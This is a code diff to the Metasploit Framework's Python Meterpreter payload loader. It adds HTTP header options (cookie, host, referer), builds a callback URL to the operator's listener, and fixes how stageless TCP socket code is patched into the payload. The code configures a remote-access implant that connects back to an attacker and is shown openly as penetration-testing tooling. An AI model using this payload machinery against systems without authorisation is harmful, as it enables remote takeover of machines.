@@ -1,6 +1,7 @@
 # -*- coding: binary -*-
 
 require 'msf/core'
+require 'msf/core/payload/transport_config'
 require 'msf/base/sessions/meterpreter_options'
 require 'msf/core/payload/uuid/options'
 
@@ -16,6 +17,7 @@ module Payload::Python::MeterpreterLoader
 
   include Msf::Payload::Python
   include Msf::Payload::UUID::Options
+  include Msf::Payload::TransportConfig
   include Msf::Sessions::MeterpreterOptions
 
   def initialize(info = {})
@@ -28,10 +30,20 @@ module Payload::Python::MeterpreterLoader
       'Stager'        => {'Payload' => ""}
     ))
 
-    register_advanced_options([
-      OptBool.new('MeterpreterTryToFork', [ true, 'Fork a new process if the functionality is available', true ]),
-      OptBool.new('PythonMeterpreterDebug', [ true, 'Enable debugging for the Python meterpreter', false ])
-    ], self.class)
+    register_advanced_options(
+      [
+        OptBool.new(
+          'MeterpreterTryToFork',
+          'Fork a new process if the functionality is available',
+          default: true
+        ),
+        OptBool.new(
+          'PythonMeterpreterDebug',
+          'Enable debugging for the Python meterpreter'
+        ),
+      ] +
+      Msf::Opt::http_header_options
+    )
   end
 
   def stage_payload(opts={})
@@ -85,26 +97,46 @@ module Payload::Python::MeterpreterLoader
     end
     met.sub!("SESSION_GUID = \'\'", "SESSION_GUID = \'#{session_guid}\'")
 
-    http_user_agent = opts[:http_user_agent] || ds['MeterpreterUserAgent']
-    http_proxy_host = opts[:http_proxy_host] || ds['PayloadProxyHost'] || ds['PROXYHOST']
-    http_proxy_port = opts[:http_proxy_port] || ds['PayloadProxyPort'] || ds['PROXYPORT']
+    http_user_agent = opts[:http_user_agent] || ds['HttpUserAgent']
+    http_proxy_host = opts[:http_proxy_host] || ds['HttpProxyHost'] || ds['PROXYHOST']
+    http_proxy_port = opts[:http_proxy_port] || ds['HttpProxyPort'] || ds['PROXYPORT']
+    http_header_host = opts[:header_host] || ds['HttpHostHeader']
+    http_header_cookie = opts[:header_cookie] || ds['HttpCookie']
+    http_header_referer = opts[:header_referer] || ds['HttpReferer']
 
-    # patch in the stageless http(s) connection url
-    met.sub!('HTTP_CONNECTION_URL = None', "HTTP_CONNECTION_URL = '#{var_escape.call(opts[:url])}'") if opts[:url].to_s != ''
-    met.sub!('HTTP_USER_AGENT = None', "HTTP_USER_AGENT = '#{var_escape.call(http_user_agent)}'") if http_user_agent.to_s != ''
+    # The callback URL can be different to the one that we're receiving from the interface
+    # so we need to generate it
+    # TODO: move this to somewhere more common so that it can be used across payload types
+    unless opts[:url].to_s == ''
 
-    if http_proxy_host.to_s != ''
-      proxy_url = "http://#{http_proxy_host}:#{http_proxy_port}"
-      met.sub!('HTTP_PROXY = None', "HTTP_PROXY = '#{var_escape.call(proxy_url)}'")
+      # Build the callback URL (TODO: share this logic with TransportConfig
+      uri = "/#{opts[:url].split('/').reject(&:empty?)[-1]}"
+      opts[:scheme] ||= opts[:url].to_s.split(':')[0]
+      scheme, lhost, lport = transport_uri_components(opts)
+      callback_url = "#{scheme}://#{lhost}:#{lport}#{ds['LURI']}#{uri}/"
+
+      # patch in the various payload related configuration
+      met.sub!('HTTP_CONNECTION_URL = None', "HTTP_CONNECTION_URL = '#{var_escape.call(callback_url)}'")
+      met.sub!('HTTP_USER_AGENT = None', "HTTP_USER_AGENT = '#{var_escape.call(http_user_agent)}'") if http_user_agent.to_s != ''
+      met.sub!('HTTP_COOKIE = None', "HTTP_COOKIE = '#{var_escape.call(http_header_cookie)}'") if http_header_cookie.to_s != ''
+      met.sub!('HTTP_HOST = None', "HTTP_HOST = '#{var_escape.call(http_header_host)}'") if http_header_host.to_s != ''
+      met.sub!('HTTP_REFERER = None', "HTTP_REFERER = '#{var_escape.call(http_header_referer)}'") if http_header_referer.to_s != ''
+
+      if http_proxy_host.to_s != ''
+        proxy_url = "http://#{http_proxy_host}:#{http_proxy_port}"
+        met.sub!('HTTP_PROXY = None', "HTTP_PROXY = '#{var_escape.call(proxy_url)}'")
+      end
     end
 
     # patch in any optional stageless tcp socket setup
     unless opts[:stageless_tcp_socket_setup].nil?
+      offset_string = ""
+      /(?<offset_string>\s+)# PATCH-SETUP-STAGELESS-TCP-SOCKET #/ =~ met
       socket_setup = opts[:stageless_tcp_socket_setup]
       socket_setup = socket_setup.split("\n")
-      socket_setup.map! {|line| "\t\t#{line}\n"}
+      socket_setup.map! {|line| "#{offset_string}#{line}\n"}
       socket_setup = socket_setup.join
-      met.sub!("\t\t# PATCH-SETUP-STAGELESS-TCP-SOCKET #", socket_setup)
+      met.sub!("#{offset_string}# PATCH-SETUP-STAGELESS-TCP-SOCKET #", socket_setup)
     end
 
     met
